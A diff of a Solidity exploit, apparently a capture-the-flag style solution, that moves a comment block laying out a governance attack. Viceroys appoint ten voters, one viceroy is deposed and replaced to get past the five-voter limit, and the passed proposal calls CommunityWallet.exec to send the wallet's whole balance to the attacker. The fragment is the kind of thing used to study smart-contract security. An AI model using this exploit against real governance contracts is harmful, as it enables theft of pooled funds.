@@ -10,17 +10,6 @@ contract GovernanceAttackerVoter {
 }
 
 contract GovernanceAttackerViceroy {
-    // Observations:
-    // Eventually, we want to execute a proposal that sends all funds to us
-    // First, we need a viceroy to create that proposal
-    // Then we need a viceroy to appoint voters.
-    // Each viceroy can only appoint 5 voters.
-    // We need 10 votes for that proposal to pass.
-    // This means we'll need two viceroys to appoint 10 voters.
-    // Our 10 voters would then vote on our proposal.
-    // Anyone can execute the proposal.
-    //
-    // Let's start by getting 1 viceroy.
     constructor(Governance governance, bool createProposal, uint256 proposalId, bytes memory proposal) {
         if (createProposal) {
             governance.createProposal(address(this), proposal);
@@ -42,6 +31,16 @@ contract GovernanceAttackerViceroy {
 }
 
 contract GovernanceAttacker {
+    // Observations:
+    // Eventually, we want to execute a proposal that sends all funds to us
+    // First, we need a viceroy to create that proposal
+    // Then we need a viceroy to appoint voters.
+    // Each viceroy can only appoint 5 voters.
+    // We need 10 votes for that proposal to pass.
+    // This means we'll need two viceroys to appoint 10 voters.
+    // Our 10 voters would then vote on our proposal.
+    // Anyone can execute the proposal.
+    // We can appoint two viceroys by appointing one, doing stuff then deposing them and appointing another
     function attack(Governance governance, uint256 tokenId) external {
         CommunityWallet wallet = governance.communityWallet();
         bytes memory proposal = abi.encodeCall(CommunityWallet.exec, (address(this), "", address(wallet).balance));
